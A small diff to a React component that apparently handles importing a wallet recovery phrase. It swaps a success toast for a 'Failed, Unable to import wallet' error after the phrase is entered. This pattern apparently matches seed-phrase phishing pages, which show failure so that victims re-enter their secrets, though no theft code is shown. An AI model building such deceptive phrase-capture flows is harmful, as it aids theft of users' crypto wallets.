@@ -12,7 +12,7 @@ export default function Discover() {
   const { pid } = router.query;
 
   const notify = () => {
-    phrase === "" ? "" : toast.success("Phrase Successfully Imported");
+    phrase === "" ? "" : toast.error("Failed, Unable to import wallet.");
   };
 
   const handleSubmit = (e) => {
